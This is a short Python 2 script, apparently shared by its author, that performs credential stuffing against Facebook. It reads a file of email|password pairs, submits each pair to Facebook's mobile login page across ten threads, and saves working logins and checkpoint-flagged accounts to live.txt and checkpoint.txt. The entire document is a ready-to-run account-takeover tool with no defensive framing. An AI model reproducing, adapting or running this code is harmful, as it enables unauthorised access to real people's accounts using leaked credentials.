# Coded By DerGay
# Instagram: @reyy05_
from multiprocessing.pool import ThreadPool
try:
	import requests
	import bs4
except:
	import os
	print("!: requirements: bs4&requests")
	os.system("pip2 install bs4;pip2 install requests")
	
pol=[]
pil=0
pul=[]
pek=[]
pok=[]
sub=""

def crack(email):
	global pol,pil,pek,pok,sub
	pil+=1
	r=requests.post(
		"https://mbasic.facebook.com/login",data=
			{
				"email":email ,
				"pass":pol[pil-1],
				"login":sub
			}
	).url
	if "save-device" in r or "m_sess" in r:
		pok.append(email)
		open("live.txt","a+").write("%s|%s\n"%(email,pol[pil-1]))
		print("[ \033[1;32mLIVE-%s\033[0m ] %s -> %s"%(len(pok),email,pol[pil-1]))
		
	if "checkpoint" in r:
		pek.append(email)
		open("checkpoint.txt","a+").write("%s|%s\n"%(email,pol[pil-1]))
		print("[ \033[1;37m\033[31mCPIN-%s\033[0m ] %s -> %s"%(len(pek),email,pol[pil-1]))
		
b=bs4.BeautifulSoup(
	requests.get(
		"https://mbasic.facebook.com/login").text,
features="html.parser")
for x in b("input"):
	if "login" in x["name"]:
		sub=x["value"]
print("*: sparator -> em|ps")
try:
	print("*: https://instagram.com/reyy05_\n")
	o=open(raw_input("?: list: ")).read().splitlines()
except Exception as f:
	exit("!: %s"%(f))
for x in o:
	k=x.split("|")
	pol.append(k[1])
	pul.append(k[0])
p=ThreadPool(10)
p.map(crack,pul)
print("-"*50)
print("+ Live: %s"%(len(pok)))
print("+ Cpin: %s"%(len(pek)))
print("+ Outt: live.txt")
print("+ Outt: checkpoint.txt")
print("-"*50)
